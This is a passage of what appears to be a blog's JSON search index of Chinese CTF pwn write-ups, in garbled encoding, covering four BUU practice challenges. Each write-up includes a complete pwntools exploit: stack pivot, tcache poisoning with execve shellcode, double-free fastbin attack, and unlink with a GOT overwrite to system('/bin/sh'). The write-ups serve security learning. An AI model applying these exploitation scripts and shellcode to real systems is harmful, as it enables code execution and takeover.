ä¸ºbase64å­—ç¬¦é›†ï¼Œbase64.b64encodeï¼ˆï¼‰å‡½æ•°æ˜¯Pythonæ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†äºŒè¿›åˆ¶æ•°æ®ç¼–ç ä¸ºBase64å­—ç¬¦ä¸²ï¼Œåœ¨ç¨‹åºä¸­ç»è¿‡Base64Decodeï¼ˆï¼‰å‡½æ•°ç¼–ç ä¸ºäºŒè¿›åˆ¶æ•°æ®ç¼–ç ï¼Œä¹Ÿå°±æ˜¯åŸæ¥çš„æ•°æ®ï¼Œåœ¨ç¨‹åºä¸­ä¼šæŠŠæ•°æ®ç»™bssæ®µä¸Šçš„inputï¼Œè¿›å…¥authå‡½æ•°ä¼šå°†æ•°æ®ä¼ ç»™v4,v4çš„å¤§å°æ˜¯å…«å­—èŠ‚ï¼Œä¼šè¦†ç›–åˆ°ebp,ebpæ˜¯inputçš„åœ°å€0x811EB40,ç„¶åauthå‡½æ•°ç»“æŸçš„æ—¶å€™ï¼ŒleaveæŒ‡ä»¤ä»¥åespä¼šæŒ‡å‘0x811eb40ï¼Œç„¶ååˆ°ä¸‹ä¸€ä¸ªæŒ‡ä»¤espè‡ªåŠ¨åŠ å››ï¼Œesp=esp+4ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨correctå‡½æ•°çš„åœ°å€ï¼Œç„¶åææƒ expfrom pwn import* import base64 from LibcSearcher import * p=remote(&quot;node4.buuoj.cn&quot;,29010) #p=process(&quot;./login&quot;) context.log_level=&quot;debug&quot; shell=0x08049284 fake_addr=0x811eb40 # payload=&#39;a&#39;*0x4+p32(shell)+p32(fake_addr) payload=base64.b64encode(payload) #gdb.attach(p) sleep(1) p.sendlineafter(&#39;Authenticate :&#39;,payload) #p.sendline(payload) p.interactive()","categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"}]},{"title":"sctf_2019_easy_heap","slug":"sctf-2019-easy-heap","date":"2023-10-21T12:16:40.000Z","updated":"2023-10-22T14:37:00.423Z","comments":true,"path":"2023/10/21/sctf-2019-easy-heap/","link":"","permalink":"http://example.com/2023/10/21/sctf-2019-easy-heap/","excerpt":"","text":"è¿™é“é¢˜ç”¨off by nullè§£ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€,ä¸èƒ½åˆ©ç”¨gotè¡¨ï¼Œåªèƒ½ç”¨hookçš„åœ°å€ ç¨‹åºè¿è¡Œå‰ä¼šæ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠbufçš„åœ°å€æ˜ å°„åˆ°æŸä¸ª0x1000å¤§å°çš„åœ°å€ä¸Šï¼Œå¹¶è¿”å›è¿™ä¸ªåœ°å€ï¼Œè€Œä¸”è¿™ä¸ªåœ°å€æ˜¯å¯æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨shellcodeã€‚mmap()å‡½æ•°çš„æƒé™å‚æ•°æŒ‡å®šäº†å°†è¦æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜åŒºåŸŸçš„è®¿é—®æƒé™ã€‚æƒé™å‚æ•°å¯ä»¥æ˜¯ä»¥ä¸‹å€¼ä¹‹ä¸€ï¼š PROT_EXECï¼šå…è®¸å¯¹å†…å­˜æ˜ å°„åŒºåŸŸè¿›è¡Œæ‰§è¡Œè®¿é—®ã€‚ PROT_READï¼šå…è®¸å¯¹å†…å­˜æ˜ å°„åŒºåŸŸè¿›è¡Œè¯»å–è®¿é—®ã€‚ PROT_WRITEï¼šå…è®¸å¯¹å†…å­˜æ˜ å°„åŒºåŸŸè¿›è¡Œå†™å…¥è®¿é—®ã€‚ PROT_NONEï¼šç¦æ­¢å¯¹å†…å­˜æ˜ å°„åŒºåŸŸè¿›è¡Œä»»ä½•è®¿é—®ã€‚ å½“æƒé™å‚æ•°çš„å€¼ä¸º7æ—¶ï¼Œå®é™…ä¸Šæ˜¯å°†PROT_EXECã€PROT_READå’ŒPROT_WRITEä¸‰ä¸ªæƒé™ç»„åˆåœ¨ä¸€èµ·ï¼Œ7=4+2+1ã€‚å› æ­¤ï¼Œæƒé™å‚æ•°ä¸º7è¡¨ç¤ºå°†å†…å­˜æ˜ å°„åŒºåŸŸè®¾ç½®ä¸ºå¯æ‰§è¡Œã€è¯»å–å’Œå†™å…¥ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œä¸å»ºè®®å°†è¿™äº›æƒé™ç»„åˆåœ¨ä¸€èµ·ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨æ¼æ´ã€‚é€šå¸¸å»ºè®®åªä½¿ç”¨å¿…è¦çš„æƒé™æ¥ä¿æŠ¤å†…å­˜æ˜ å°„åŒºåŸŸçš„å®‰å…¨æ€§ã€‚ å•ç‹¬åœ°æŠŠè¾“å…¥å †é‡Œçš„å†…å®¹çš„å‡½æ•°æ”¾å‡ºæ¥ï¼ŒåŒå‡»ä¸€ä¸‹ï¼Œå°±æ˜¯ç›¸å½“äºreadå‡½æ•° æŒ‰ç…§é¢˜è§£é‡Œçš„æµç¨‹ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª0x410å¤§å°çš„å †ï¼Œå¹¶æ¥æ”¶å…¶åœ°å€,è¿™ä¸ªåœ°å€å­˜äº†mallocçš„å †çš„åœ°å€add(0x410) p.recvuntil(&#39;Address &#39;) chunk0_addr=int(p.recv(14),16) ç„¶åå†åˆ›å»ºå››ä¸ªå¤§å°ä¸åŒçš„å † add(0x28) add(0x18) add(0x4f8) add(0x10) ç„¶åfreeæ‰å †0dele(0) ç„¶åeditå †2,ä¹Ÿå°±æ˜¯è¾“å…¥å†…å®¹ï¼Œæ„é€ ä¸‹é¢çš„unlinkpayload=p64(0)*2+p64(0x420+0x20+0x30) åœ¨freeå †3åï¼Œå°±ä¼šunlinkåˆå¹¶ï¼Œå››ä¸ªå †åˆå¹¶åœ¨ä¸€èµ·dele(3) freeå †3 è¿™é‡Œå­˜å †0ï¼Œå †3çš„æŒ‡é’ˆéƒ½è¢«æ¸…æ‰äº†ã€‚ å†freeå †1ï¼Œå †2 ç„¶ååˆmallocä¸¤æ¬¡,ä¸¤ä¸ªå¤§å°åŠ èµ·æ¥åˆšå¥½æ˜¯0x970,ä¼šä»åŸæ¥çš„freechunkä¸­æ‹¿ã€‚add(0x440) add(0x510) ç„¶åç¼–è¾‘è¿™ä¸¤ä¸ªå †çš„å†…å®¹payload=p64(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10) fill(0,payload) fill(1,&#39;\\x30&#39;) ç¼–è¾‘å®Œåï¼Œè¿™æ˜¯å †0çš„ æˆåŠŸä¿®æ”¹äº†0x30çš„tachebinæŒ‡é’ˆæˆmmap+10çš„åœ°å€ï¼Œ0x5577338a86b0è¿™æ˜¯æœ€åä¸€ä¸ªå †çš„åœ°å€ï¼Œtachebinæœºåˆ¶åœ¨freechunké‡Œçš„æœ€åä¸€ä¸ªå †æŒ‡å‘main_arena+96è¿™ä¸ªåœ°å€ã€‚ è¿™æ˜¯å †1çš„ï¼ŒbinæŒ‡é’ˆä¿®æ”¹æˆäº†malloc_hookçš„åœ°å€ã€‚ åŸæœ¬çš„è¯æŒ‡å‘main_arena+96è¿™ä¸ªåœ°å€ï¼Œæ”¹æ‰æœ€åçš„å­—èŠ‚æˆ0x30å°±æ˜¯malloc_hookçš„åœ°å€ å†mallocä¸¤æ¬¡ï¼ŒæŠŠå¤šä½™çš„freechunkæ‹¿æ‰add(0x28)#2 add(0x18)#3 å†addå †5ï¼Œä¹Ÿå°±æ˜¯åœ¨maap+10è¿™ä¸ªåœ°å€ä¸Šæ”¾shellcodeï¼Œæ‰‹å†™shellcodeæ˜¯çœŸçš„å¼ºå¥½å§add(0x28)#5 payload2 = b&quot;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&quot; fill(5,payload2 + &#39;\\n&#39;) å†addå †6ï¼Œå¤§å°åœ¨0x10åˆ°0x18ä¹‹é—´æ‰èƒ½åœ¨0x20çš„tachebin(malloc_hook)é‡Œç”³è¯·ï¼Œè¿™é‡Œæˆ‘ä»¬æ”¾ä¸Šst_addr+0x10çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯maap_addr+0x10çš„åœ°å€ã€‚add(0x18)#6 edit(6,p64(st_addr + 0x10) + &#39;\\n&#39;) è¿™æ˜¯å †5å’Œå †6çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯mmap+10çš„åœ°å€å’Œmalloc_hookçš„åœ°å€ æœ€åï¼Œå†mallocä¸€æ¬¡ï¼Œå°±ä¼šæ‰§è¡Œmalloc_hook,è€Œè¿™ä¸ªåœ°å€å°±ä¼šå»æ‰§è¡Œmmap+0x10è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€æ”¾åˆshellcodeï¼ŒæˆåŠŸææƒã€‚expfrom pwn import* from LibcSearcher import * p=remote(&quot;node4.buuoj.cn&quot;,29573) #p=process(&quot;./sctf_2019_easy_heap&quot;) context(arch=&#39;amd64&#39;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) def add(size): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;) p.sendlineafter(&#39;Size: &#39;,str(size)) def fill(index,content): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) p.sendlineafter(&#39;Content: &#39;,content) def dele(index): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) p.recvuntil(&#39;Mmap: &#39;) mmap_addr=int(p.recv(12),16) print(hex(mmap_addr)) add(0x410) add(0x28) add(0x18) add(0x4f8) add(0x10) dele(0) payload=p64(0)*2+p64(0x420+0x20+0x30) fill(2,payload) dele(3) dele(1) dele(2) add(0x440) add(0x510) payload=&#39;a&#39;*(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10) fill(0,payload) fill(1,&#39;\\x30&#39;) add(0x28)#2 add(0x18)#3 add(0x28)#5 add(0x18)#6 payload2 = b&quot;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&quot; fill(5,payload2) fill(6,p64(mmap_addr + 0x10)) add(0x10) p.interactive()","categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"}]},{"title":"","slug":"gyctf_2020_some_thing_exceting","date":"2023-10-16T12:27:11.330Z","updated":"2023-10-16T12:50:52.369Z","comments":true,"path":"2023/10/16/gyctf_2020_some_thing_exceting/","link":"","permalink":"http://example.com/2023/10/16/gyctf_2020_some_thing_exceting/","excerpt":"","text":"gyctf_2020_some_thing_excetingæœ‰ç‚¹å¥‡æ€ªçš„UAFé¢˜ï¼Œdouble free æœ‰ç‚¹å¥‡æ€ªåšè¿™é“é¢˜å‰å…ˆåœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªflagæ–‡ä»¶ï¼Œä¸ç„¶çš„è¯ç¨‹åºè¿è¡Œä¸èµ·æ¥ flagæ˜¯åœ¨bssæ®µä¸Šçš„ï¼ŒåŒå‡»fgetsé‡Œçš„sï¼Œå¯ä»¥çœ‹åˆ°flagæ˜¯æ”¾åœ¨0x6020a8 é™¤äº†æ²¡æœ‰editå‡½æ•°ï¼Œå…¶ä»–éƒ½æœ‰addå‡½æ•°ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª0x10å¤§å°çš„å †ï¼Œç„¶åä¼šå†åˆ›å»ºä¸¤ä¸ªå †ï¼Œ0x10çš„å †ä¸Šæ”¾ä¸¤å¤–çš„ä¸¤ä¸ªå †çš„åœ°å€ï¼Œç„¶åæ˜¯è¾“å…¥å†…å®¹ã€‚ showå‡½æ•°ï¼Œå°†ä¸¤ä¸ªåœ°å€çš„å†…å®¹éƒ½æ‰“å°å‡ºæ¥ï¼ŒåæœŸæ˜¯ç”¨æ¥æ‰“å°flag deleå‡½æ•°ï¼Œæ²¡æœ‰æŠŠbssä¸Šçš„å †æŒ‡é’ˆç½®é›¶ï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œå¯ä»¥double free æ¼æ´æ˜¯åˆ©ç”¨double free ,å…ˆå•ç‹¬freeåŒä¸€ä¸ªä¸¤æ¬¡å †ä¸è¡Œï¼Œå¾—å…ˆåˆ›å»ºä¸¤æ¬¡bss=0x6020a8-0x10 add(0x40,&#39;MMMM&#39;,0x50,&#39;NNNN&#39;) add(0x40,&#39;AAAA&#39;,0x40,&#39;BBBB&#39;) dele(0) dele(1) è¿™æ˜¯freeæ‰ç¬¬äºŒä¸ªå †æ—¶å€™çš„æ ·å­ä»¥åŠå…¶binçš„æ ·å­ï¼Œfreeå‡½æ•°çš„åœ°å€å¯ä»¥æ˜¯é›¶ dele(0) #double free è¿™é‡Œçš„è¯æ˜¯double free ï¼Œå½¢æˆä¸¤ä¸ªå¾ªç¯é“¾è¡¨ï¼Œ0x20å¤§å°çš„fastbinä¸­0x1855240æŒ‡å‘0x1852300ï¼Œ0x1852300æŒ‡å‘0x1852240ã€‚0x50å¤§å°çš„fastbinä¸­0x18522b0æŒ‡å‘0x1852370ç­‰ç­‰ add(0x40,p64(bss),0x40,&#39;AAAA&#39;) å†addä¸€ä¸‹çš„è¯ï¼Œä¼šå…ˆåœ¨biné‡Œå–ï¼Œè¿™é‡Œçš„è¯æŠŠå…ˆåœ¨0x18522b0å’Œ0x2952370å†™ä¸Šå†…å®¹ï¼Œç„¶åå°±æŠŠbiné“¾ç»™æ”¹æ‰äº†0x50çš„fastbinè¿™é‡ŒæŒ‡å‘äº†æœ€åçš„flagåœ°å€ å†addä¸€æ¬¡ä¼šæŠŠå‰é¢ä¸¤ä¸ª0x50å¤§å°çš„fastbinç»™æ‹¿æ‰ï¼Œç„¶åçš„åªå‰©ä¸‹æœ€åä¸€ä¸ªflagçš„å †çš„åœ°å€add(0x40,&#39;MMMM&#39;,0x40,&#39;kkkk&#39;) å†mallocä¸€æ¬¡0x40çš„å¤§å°å°±èƒ½æŠŠflagå †åœ°å€æ”¹å†™åˆ°0x20å¤§å°çš„å †ä¸Šï¼Œä½†æ˜¯ä¸ºäº†ç»•è¿‡fastbinçš„æ£€æŸ¥ï¼Œå¾—malloc 0x50çš„å¤§å°ï¼Œæ‰€ä»¥å‰é¢ä¹Ÿå¾—æ”¹æˆ0x50çš„å¤§å°ï¼Œå†showçš„è¯å°±ä¼šæŠŠflagè¾“å‡ºå‡ºæ¥ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ç¬¬äº”ä¸ªå †ï¼Œå› ä¸ºå‰é¢çš„bssæ®µä¸Šçš„å †æŒ‡é’ˆéƒ½æ²¡æœ‰ç½®é›¶ã€‚show(4) æƒ³åœ¨bssæ®µä¸Šç”³è¯·å †ï¼Œéœ€è¦0x50çš„å¤§å°æ‰èƒ½ç»•è¿‡fastbinçš„æ£€æŸ¥ï¼Œè¿™é‡Œé€‰0x602098åˆšå¥½ã€‚ expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,26884) p=process(&quot;./gyctf_2020_some_thing_exceting&quot;) elf=ELF(&#39;./gyctf_2020_some_thing_exceting&#39;) libc=ELF(&#39;./libc-2.23.so&#39;) context.log_level=&quot;debug&quot; def add(size1,content1,size2,content2): p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;1&#39;) p.sendlineafter(&quot;&gt; ba&#39;s length : &quot;,str(size1)) p.sendlineafter(&#39;&gt; ba : &#39;,content1) p.sendlineafter(&quot;&gt; na&#39;s length : &quot;,str(size2)) p.sendlineafter(&#39;&gt; na : &#39;,content2) def dele(index): p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;3&#39;) p.sendlineafter(&#39;Banana ID :&#39;,str(index)) def show(index): p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;4&#39;) p.sendlineafter(&#39;&gt; Banana ID : &gt; SCP project ID : &#39;,str(index)) bss=0x6020a8-0x10 add(0x50,&#39;MMMM&#39;,0x50,&#39;NNNN&#39;) add(0x50,&#39;AAAA&#39;,0x50,&#39;BBBB&#39;) dele(0) dele(1) dele(0) add(0x50,p64(bss),0x50,&#39;AAAA&#39;) add(0x50,&#39;MMMM&#39;,0x50,&#39;kkkk&#39;) add(0x50,b&#39;1&#39;,0x60,b&#39;&#39;) show(4) #gdb.attach(p) sleep(1) #pause() #dele(0) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"","slug":"zctf_2016_note3","date":"2023-10-14T13:49:24.054Z","updated":"2023-10-15T05:14:09.930Z","comments":true,"path":"2023/10/14/zctf_2016_note3/","link":"","permalink":"http://example.com/2023/10/14/zctf_2016_note3/","excerpt":"","text":"zctf_2016_note3è¿™é“é¢˜å‡½æ•°è¾ƒå¤šï¼Œä½†æ˜¯ç›¸å¯¹æ¥è¯´è¿˜æ˜¯ä¸€èˆ¬çš„å †é¢˜ï¼Œå‡½æ•°å¤šå¯ä¸€å¤šç†è§£ï¼Œä¸‹é¢å¼€å§‹ä¸€ä¸€è®²è§£ã€‚å…ˆçœ‹addå‡½æ•° ç¬¬åäºŒè¡Œçš„sizeå‡½æ•°ï¼Œæ˜¯ç”¨æ¥è¾“å…¥æˆ‘ä»¬è¦ç”³è¯·å¤§å°çš„å †ï¼Œç‚¹è¿›å»çœ‹æœ‰ç‚¹å¤æ‚ï¼Œä½†å…¶å®å’Œscanfå·®ä¸å¤šï¼Œé‡Œé¢è¿˜æœ‰ä¸ªsub_4008ddçš„å‡½æ•°ï¼Œå†ç‚¹è¿›å» sub_4008ddå‡½æ•°ï¼Œè¿™ä¸ªç›¸å½“äºreadå‡½æ•°ï¼Œåœ¨ä¸‹é¢çš„å¥½å‡ ä¸ªå‡½æ•°éƒ½è°ƒç”¨åˆ°ï¼Œå…ˆçœ‹å‡½æ•°çš„å‚æ•°ç¬¬ä¸‰ä¸ªå‚æ•° char a3ï¼Œå…¶å€¼æ˜¯10ï¼Œç¬¬ä¸€ä¸ªå‚æ•°a1æ˜¯è¾“å…¥çš„åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯è¾“å…¥çš„sizeï¼Œä¸€ä¸ªä¸ªè¾“å…¥ä¿å­˜åœ¨v7ä¸­ä½†æ˜¯æœ€é•¿ä¸ä¼šè¶…è¿‡32çš„é•¿åº¦ï¼Œé‡åˆ°â€™\\x00â€™æ—¶ç»“æŸï¼Œè¿™é‡Œçš„a3=10å…¶å®å°±æ˜¯æˆªæ­¢ç¬¦â€™\\xaâ€™ï¼Œåé¢ä¸¤æ¡å·²ç»ä¸é‡è¦äº†ã€‚ æœ€åè¿”å›çš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„ç¬¬åäºŒè¡Œsizeçš„å€¼ã€‚ç¬¬åä¹è¡Œçš„sub_4008ddå‡½æ•°ä¹Ÿæ˜¯åŒç†ï¼Œä¸è¿‡è¾“å…¥çš„é•¿åº¦æœ‰sizeå†³å®šã€‚å¤–é¢çš„sub_400a30å‡½æ•°é‡Œçš„nptræ˜¯åœ¨bssæ®µä¸Šçš„åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯mallocçš„åœ°å€ï¼Œç¬¬ä¸€ä¸ªå­˜æ”¾åœ°å€ï¼Œç¬¬äºŒä¸ªåŠ å…«çš„åœ°å€å­˜æ”¾size editå‡½æ•°ï¼Œå…ˆçœ‹ç¬¬16è¡Œçš„readå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•° *(&amp;ptr + v3)å…¶å®å°±æ˜¯å­˜åœ¨å †ä¸Šçš„åœ°å€ï¼Œv3æŒ‡çš„ç¬¬å‡ ä¸ªå †ï¼Œç¬¬äºŒä¸ªå‚æ•°ï¼Œå°±æ˜¯bsså­˜å †åœ°å€å†åŠ 8çš„åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯mallocçš„å¤§å°ï¼Œå’ŒåŸæ¥çš„ä¸€æ ·ï¼Œæ‰€ä»¥ä¸å­˜åœ¨å †æº¢å‡ºçš„æƒ…å†µã€‚ deleå‡½æ•°ï¼Œbssæ®µä¸Šçš„åœ°å€æ¸…é›¶ï¼Œå †ä¸Šçš„å†…å®¹ä¹Ÿè¢«é‡Šæ”¾äº†ï¼Œæ‰€ä»¥å¹¶ä¸å­˜åœ¨UAFæ¼æ´ é‡ç‚¹çš„åœ°æ–¹åœ¨è¿™ï¼Œå°±æ˜¯unlinkçš„æ€ä¹ˆæ„é€ ã€‚å…ˆæ„é€ å››ä¸ªä¸ªå †å—ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå †å †0çš„fdå’ŒbkæŒ‡é’ˆåˆ†åˆ«æ”¾fd=ptr-0x18å’Œbk=ptr-0x10ï¼ŒåæœŸä¼šè¿›è¡Œå’Œå¹¶ptr=0x6020c8 fd=ptr-0x18 bk=ptr-0x10 payload1=p64(0)+p64(0xb1)+p64(fd)+p64(bk) add(0x90,payload1) #å †0 add(0,&#39;bbbb&#39;) #å †1 add(0x90,&#39;CCCC&#39;) #å †2 add(0x10,&#39;dddd&#39;) #å †3 dele(1) å…³äºç¬¬äºŒä¸ªå †å—ï¼Œæˆ‘ä»¬ç”³è¯·çš„æ˜¯0çš„å¤§å°ï¼Œä½†æ˜¯ptmallocä¼šæœ€å°‘ç”³è¯·0x10,åæœŸeditçš„æ—¶å€™æ˜¯å¯ä»¥æº¢å‡ºçš„ï¼Œä»è€Œè¦†ç›–æ‰å †æŒ‡é’ˆã€‚è¿™é‡Œä¼šæœ‰ä¸ªé—®é¢˜å°±æ˜¯ä¸ºä»€ä¹ˆä¸åœ¨ç¬¬ä¸€æ¬¡mallocå †1çš„æ—¶å€™å†™å…¥payload2ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡çš„è¯äº‹æº¢å‡ºä¸åˆ°å †2payload2=p64(0)*2+p64(0xb0)+p64(0xa0) add(0,payload2) è¦†ç›–åçš„å †å—æ˜¯é•¿è¿™æ ·çš„ï¼ŒæŠŠç¬¬å †2çš„å¤§å°å’Œå®ƒçš„previous in useä½æ”¹æˆäº†0,ä¹Ÿå°±æ˜¯ä¸Šä¸€ä¸ªå †å †1æ²¡æœ‰ä½¿ç”¨ å½“åˆ æ‰å †2çš„æ—¶å€™ï¼Œå®ƒä¼šæ£€æŸ¥å †1çš„ä¸¤ä¸ªæŒ‡é’ˆï¼Œæ˜¯æ»¡è¶³æ¡ä»¶çš„ï¼Œå…¶ä¸­çš„0xbbb018è¿™ä¸ªåœ°å€å­˜æ”¾sizeçš„å¤§å°æ˜¯åŒ…æ‹¬åˆ°0xbbb0b0è¿™é‡Œçš„ï¼ˆçŒœæƒ³ï¼‰ï¼Œè€Œ0xbbb0c0è¿™é‡Œçš„å¤§å°æ˜¯previous size ,0xbbb0c8è¿™é‡Œè¡¨ç¤ºä¸Šä¸€ä¸ªå †æ²¡æœ‰ä½¿ç”¨ã€‚ å½“æŠŠå †2deleteæ—¶ï¼Œè¿™å‡ ä¸ªå †å°±ä¼šè¿›è¡Œåˆå¹¶deleä¹‹å‰ï¼Œbssæ®µä¸Šå­˜æ”¾å †æŒ‡é’ˆæ˜¯è¿™æ ·çš„å¸ƒå±€ã€‚ è€Œåœ¨dele(2)åå­˜æ”¾å †2çš„æŒ‡é’ˆè¢«ç½®é›¶äº† è¿™æ˜¯å †åˆå¹¶åçš„æ ·å­ï¼Œåº”è¯¥æ˜¯å †1å’Œå †2æ˜¯æ²¡æœ‰è¢«åˆ©ç”¨çš„ç„¶åå’Œå †0åˆå¹¶äº† 0x151ä¹Ÿå°±æ˜¯ä¸­é—´0xbbb0c0è¿™é‡Œçš„å¤§å°ç›¸åŠ ä½†æ˜¯å †2è¿™é‡Œçš„å†…å­˜æ²¡æœ‰é‡Šæ”¾ä¹‹åçš„binæ˜¯è¿™æ ·çš„ ç„¶åå°±å¯ä»¥ä»0x6020b0è¿™ä¸ªä½ç½®å®è¡Œä¿®æ”¹å †æŒ‡é’ˆä»è€Œå¯¹gotè¡¨çš„æ”¹å†™payload3 = p64(0) * 2 + p64(elf.got[&#39;free&#39;]) * 2 + p64(elf.got[&#39;atoi&#39;]) + p64(0) + p64(elf.got[&#39;atoi&#39;]) edit(0,payload3) å†æŠŠeditå †0,ä¹Ÿå°±æ˜¯edit0x602018ï¼ˆfree_got)åœ°å€çš„å†…å®¹æ”¹å†™æˆ(0x400730)puts_pltedit(0,p64(0X400730)[:-1]) #puts_plt è¿™æ ·å†deleå †1çš„æ—¶å€™ä¹Ÿå°±æ˜¯free 0x6020d0è¿™ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯puts(elf.got[â€˜atoiâ€™]),ä»è€Œè·å¾—atoiçš„goté¡¹çš„å†…å®¹ï¼Œä»è€Œå¯ä»¥ç®—å‡ºlibcçš„åç§»atoi_addr = u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8, b&#39;\\x00&#39;)) success(&#39;atoi_addr = &#39; + hex(atoi_addr)) ç„¶åå†editå †3ï¼Œä¹Ÿå°±æ˜¯0x6020e0è¿™ä¸ªåœ°å€ï¼Œæ›´æ”¹atoiçš„gotè¡¨çš„åœ°å€ä¸ºsytemï¼Œå†ä»å¼€å§‹æ—¶å€™èœå•æœ‰ä¸ªatoiå‡½æ•°ç„¶åå†™å…¥çš„å†…å®¹ä¸ºâ€˜/bin/shâ€™å°±å¯ä»¥ææƒäº†ã€‚æœ€åçš„expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./zctf_2016_note3&quot;) elf=ELF(&#39;./zctf_2016_note3&#39;) libc=ELF(&#39;./libc-2.23.so&#39;) context.log_level=&quot;debug&quot; def add(size,content): p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;1&#39;) p.sendlineafter(&#39;Input the length of the note content:(less than 1024)&#39;,str(size)) p.sendlineafter(&#39;Input the note content:&#39;,content) def edit(index,content): p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;3&#39;) p.sendlineafter(&#39;Input the id of the note:&#39;,str(index)) p.sendlineafter(&#39;Input the new content:&#39;,content) def dele(index): p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;4&#39;) p.sendlineafter(&#39;Input the id of the note:&#39;,str(index)) ptr=0x6020c8 fd=ptr-0x18 bk=ptr-0x10 payload1=p64(0)+p64(0xb1)+p64(fd)+p64(bk) add(0x90,payload1) add(0,&#39;bbbb&#39;) add(0x90,&#39;CCCC&#39;) add(0x10,&#39;dddd&#39;) dele(1) payload2=p64(0)*2+p64(0xb0)+p64(0xa0) add(0,payload2) dele(2) #he bing payload3 = p64(0) * 2 + p64(elf.got[&#39;free&#39;]) * 2 + p64(elf.got[&#39;atoi&#39;]) + p64(0) + p64(elf.got[&#39;atoi&#39;]) edit(0,payload3) edit(0,p64(0X400730)[:-1]) #puts_plt dele(1) #dele di 0 ge dui atoi_addr = u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8, b&#39;\\x00&#39;)) success(&#39;atoi_addr = &#39; + hex(atoi_addr)) #gdb.attach(p) sleep(1) base=atoi_addr-libc.sym[&#39;atoi&#39;] system=base+libc.sym[&#39;system&#39;] edit(3,p64(system)) p.sendline(&#39;/bin/sh&#39;) #p.sendline(payload) p.interactive()","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"},{"name":"ctf-NewSar","slug":"ctf-NewSar","permalink":"http://example.com/tags/ctf-NewSar/"}]}